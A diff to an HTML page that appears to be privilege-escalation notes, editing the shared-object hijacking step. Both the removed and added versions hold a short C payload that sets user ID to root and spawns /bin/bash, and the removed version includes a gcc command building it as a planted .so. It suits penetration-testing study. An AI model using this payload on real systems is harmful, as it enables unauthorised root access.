@@ -674,7 +674,7 @@ layout: default
         <ul>
             <li>Find shared objects that are not found by the executable</li>
             <li>Create a shared object in the directory where the shared object is being searched for</li>
-            <pre>&#13;&#10;#include &lt;stdio.h&gt;&#13;&#10;#include &lt;sys/types.h&gt;&#13;&#10;#include &lt;unistd.h&gt;&#13;&#10;int main(void)&#13;&#10;{&#13;&#10;    setuid(0); setgid(0); system(&quot;/bin/bash&quot;);&#13;&#10;}&#13;&#10;&#13;&#10;#gcc rootshell.c -o libmalbec.so -shared -Wall -fPIC -w&#13;&#10;            </pre>
+            <pre>#define _GNU_SOURCE&#13;&#10;#include &lt;stdlib.h&gt;&#13;&#10;#include &lt;unistd.h&gt;&#13;&#10;&#13;&#10;int main(void) {&#13;&#10;    setresuid(0, 0, 0);&#13;&#10;    system(&quot;/bin/bash&quot;);&#13;&#10;}</pre>
             <li>gcc: error trying to exec 'cc1': execvp: No such file or directory</li>
             <ul>
                 <li>Check environment variables to make sure PATH has been set</li>
